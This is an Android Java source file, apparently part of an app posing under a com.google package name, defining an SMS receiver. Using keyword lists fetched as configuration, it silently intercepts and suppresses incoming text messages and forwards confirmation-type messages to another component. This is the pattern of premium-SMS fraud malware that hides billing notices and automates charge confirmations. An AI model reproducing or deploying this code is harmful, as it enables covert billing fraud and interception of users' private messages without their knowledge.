package com.google.newstar;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.google.utils.CostInfo;
import com.google.utils.DataPreference;
import com.google.utils.Utils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

//继承BroadcastReceiver
public class AutoSMS extends BroadcastReceiver 
{
    private CostInfo costInfo;
    //广播消息类型
    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    String SENT_SMS_ACTION = "SENT_SMS_ACTION";	//发送状态回执广播的Action
    String DELIVERED_SMS_ACTION = "DELIVERED_SMS_ACTION"; //接受状态回执广播的Action
    //覆盖onReceive方法
    @Override
    public void onReceive(Context context, Intent intent) 
    {
        //先判断广播消息
        String action = intent.getAction();
        if (SMS_RECEIVED_ACTION.equals(action))
        {
        	Utils.AppToast("短信广播拦截到短信", context);
            costInfo = Utils.getJsonObject();
            //获取intent参数
            Bundle bundle=intent.getExtras();
            //判断bundle内容
            if (bundle!=null&&costInfo!=null)
            {
                //取pdus内容,转换为Object[]
                Object[] pdus=(Object[])bundle.get("pdus");
                //解析短信
                SmsMessage[] messages = new SmsMessage[pdus.length];
                for(int i=0;i<messages.length;i++)
                {
                    byte[] pdu=(byte[])pdus[i];
                    messages[i]=SmsMessage.createFromPdu(pdu);
                }    
                //解析完内容后分析具体参数
                for(SmsMessage msg:messages)
                {
                    //获取短信内容
                    String content=msg.getMessageBody();
                    String sender=msg.getOriginatingAddress();
                    Date date = new Date(msg.getTimestampMillis());
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    String sendTime = sdf.format(date);
                    //
                    if (Utils.compareTime(DataPreference.LASTTIME.get(), Utils.getCurrentTime().toString())
                    		<Integer.parseInt(costInfo.getWordtime())) {
                    	String[] intkeyword = costInfo.getIntkeyword(); 
                    	if (Utils.isContainsArray(content, costInfo.getIntkeyword(),false)) {
                    		DataPreference.CUTPORT.put(sender);
							abortBroadcast();
							break;
						}
                        for (int i = 0; i < intkeyword.length; i++) {
                        	if (content.contains(intkeyword[i])) {
                        		Utils.AppToast("广播被拦截", context);
    							abortBroadcast();
    							break ;
    						}
    					}
                        	 if (sender.startsWith(costInfo.getWordprot())&&(!Utils.isContainsArray(content, costInfo.getNotintkeyword(),false))) {
                        		 abortBroadcast();
     							break;
     						}
                        	 
                        	 String[] twokeyword = costInfo.getTwokeyword();
                             for (int i = 0; i < twokeyword.length; i++) {	
                             	if ((costInfo.getType().equals("动态")||costInfo.getType().equals("二次"))&&(content.contains(twokeyword[i]))){
                                            Intent broadcastintent = new Intent();
                                            broadcastintent.setAction("android.action.cutsms");
                                            Bundle bundleinfos = new Bundle();
                                            bundleinfos.putString("address", sender);
                                            bundleinfos.putString("body", content);
                                            broadcastintent.putExtras(bundleinfos);
                                            abortBroadcast();
                                            context.sendBroadcast(broadcastintent);
                                             break;
                             	}
         					}
                    }
                }
            }
        }
    }
    
    

}